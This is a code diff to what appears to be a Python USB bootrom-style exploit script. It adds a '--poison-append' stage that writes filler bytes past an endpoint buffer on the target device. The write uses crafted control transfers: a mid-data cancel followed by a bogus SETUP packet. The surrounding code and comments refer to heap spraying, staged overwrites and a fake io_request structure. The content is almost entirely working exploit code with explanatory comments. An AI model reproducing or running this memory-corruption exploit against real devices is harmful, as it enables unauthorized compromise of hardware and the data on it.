@@ -671,7 +671,29 @@ def stage2(usb, out_spin_us, padding, debug, live_handle=None):
                       'continuing like the sketch')
                 return -7, None
             raise
-    if getattr(stage2, 'sketch_shape', False):
+    if getattr(stage2, 'poison_append', False):
+        # The sketch's set_global_state pushes two 0x40 OUTs on a 0x40-wLength
+        # SETUP: the second packet writes [0x40..0x80) PAST the endpoint
+        # allocation (the A5 'request without data phase processing' bug).
+        # The xHCI caps data at wLength, but the device appends ANY data
+        # pushed under a bogus SETUP while its pending phase is open (our own
+        # remainder trick proves this: a 0x00/0x00 SETUP carrying 1472 bytes
+        # is fully ACKed as a continuation of the pending 0x700 phase).
+        # So: deliver the first 0x40 by a mid-data cancel (phase stays open),
+        # then append the poison bytes [0x40..0x80) through the bogus SETUP.
+        rc, info = usb.raw_ctrl(handle, 0x21, REQ_DNLOAD, 0, 0, 0x40,
+                                b'\xcc' * 0x40, abandon=True, cancel_at=0,
+                                abandon_timeout_ms=0.45, timeout_ms=900,
+                                name='set-state pending')
+        if debug:
+            debug_raw('set-state pending', rc, info)
+        rc2, info2 = usb.raw_ctrl(handle, 0x00, 0x00, 0, 0, 0x40,
+                                 b'\xcc' * 0x40, abandon=True, cancel_at=0,
+                                 abandon_timeout_ms=0.45, timeout_ms=900,
+                                 name='set-state poison append')
+        if debug:
+            debug_raw('set-state poison append', rc2, info2)
+    elif getattr(stage2, 'sketch_shape', False):
         rc, info = _set_state(0x80)
     else:
         rc, info = _set_state(0x40)
@@ -943,6 +965,7 @@ def exploit(args):
                       args.spin_us, args.leak_delay_ms, args.debug, )
     if args.stage in ('all', '2'):
         stage2.sketch_shape = bool(getattr(args, 'sketch_shape', False))
+        stage2.poison_append = bool(getattr(args, 'poison_append', False))
         live2 = stage2(usb, args.out_spin_us, args.padding, args.debug,
                        live_handle=live)
         live = live2 if live is not None else live
@@ -1174,6 +1197,12 @@ def main():
                         help='do not reset or re-acquire between stages: keep '
                              'talking on the live spray/armed handle (the '
                              'Arduino never re-enumerates)')
+    parser.add_argument('--poison-append', action='store_true', default=False,
+                        help='deliver the sketch set-state poison packet via '
+                             'the pending-append channel: first 0x40 by a '
+                             'mid-data cancel, then 0x40 of 0xcc under a '
+                             'bogus SETUP (lands [0x40..0x80) past the '
+                             'endpoint allocation - the A5 append bug)')
     parser.add_argument('--stage3-wipe', type=lambda x: int(x, 0), default=0,
                         help='A8-era variant: replace the fake-io_request '
                              'overwrite with a zero-wipe transfer of N bytes '
